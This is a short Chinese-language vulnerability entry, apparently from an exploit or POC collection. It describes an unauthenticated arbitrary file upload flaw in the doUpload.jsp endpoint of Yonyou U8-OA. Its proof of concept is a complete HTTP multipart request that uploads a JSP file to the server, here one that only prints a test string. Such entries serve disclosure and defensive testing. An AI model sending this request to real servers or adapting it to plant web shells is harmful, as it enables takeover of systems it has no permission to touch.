# 用友U8-OA任意文件上传漏洞

>用友U8-OA协同工作系统遵循J2EE架构,以JSP和JAVA BEAN技术作为主要的系统实现手段,开发出了工作流、文档、消息提醒和插件接口。

## **漏洞描述**

用友U8-OA协同工作系统doUpload.jsp接口存在任意文件上传漏洞，未授权的攻击者可以通过该漏洞上传恶意文件，从而控制服务器。

## 漏洞类型

文件上传

## 影响范围

-   用友U8-协同工作系统

## 漏洞POC

```http
POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
Host: {host}
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 219
Content-Type: multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75

--7b1db34fff56ef636e9a5cebcd6c9a75
Content-Disposition: form-data; name="iconFile"; filename="info.jsp"
Content-Type: application/octet-stream

<% out.println("tteesstt1"); %>
--7b1db34fff56ef636e9a5cebcd6c9a75--
```

